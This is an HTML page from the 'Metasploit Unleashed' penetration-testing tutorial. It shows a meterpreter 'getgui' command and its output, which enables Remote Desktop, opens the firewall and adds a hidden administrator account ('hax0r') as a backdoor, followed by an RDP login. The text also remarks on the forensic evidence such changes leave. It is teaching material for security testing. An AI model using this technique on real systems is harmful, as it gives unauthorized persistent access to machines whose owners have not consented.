<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Enabling Remote Desktop</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Enabling
Remote Desktop</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Let's look at another situation where
Metasploit makes it very easy
to backdoor the system using nothing more than built-in system tools.
We will utilize Carlos Perez's 'getgui' script, which enables Remote
Desktop and creates a user account for you to log into it with.
Utilization of this script could not be easier.
<br>
<br>
</p>
<pre id="code"><u>meterpreter</u> &gt; run getgui -u hax0r -p gibs0n<br>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator<br>[*] Carlos Perez carlos_perez@darkoperator.com<br>[*] Enabling Remote Desktop<br>[*] RDP is disabled enabling it ...<br>[*] Setting Terminal Services service startup mode<br>[*] The Terminal Services service is not set to auto, changing it to auto ...<br>[*] Opening port in local firewall if necessary<br>[*] Setting user account for logon<br>[*] Adding User: hax0r with Password: gibs0n<br>[*] Adding User: hax0r to local group Remote Desktop Users<br>[*] Adding User: hax0r to local group Administrators<br>[*] You can now login with the created user<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">And we are done! That is it. Lets
test the connection to see if it can really be that easy.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Remote_desktop_01.png"
 class="image"><img alt="Remote desktop 01.png"
 src="http://www.offensive-security.com/w/images/b/b8/Remote_desktop_01.png"
 width="759" height="253"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
And here we see that it is. We used the 'rdesktop' command and
specified the username and password we want to use for the log in. We
then received an error message letting us know a user was already
logged into the console of the system, and that if we continue, that
user will be disconnected. This is expected behavior for a Windows XP
desktop system, so we can see everything is working as expected. Note
that Windows Server allows concurrent graphical logons so you may not
encounter this warning message.
</p>
<p style="color: rgb(0, 0, 0);">Remember, these sorts of changes can be
very powerful. However,
use that power wisely, as all of these steps alter the systems in ways
that can be used by investigators to track what sort of actions were
taken on the system. The more changes that are made, the more evidence
you leave behind. <br>
<br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
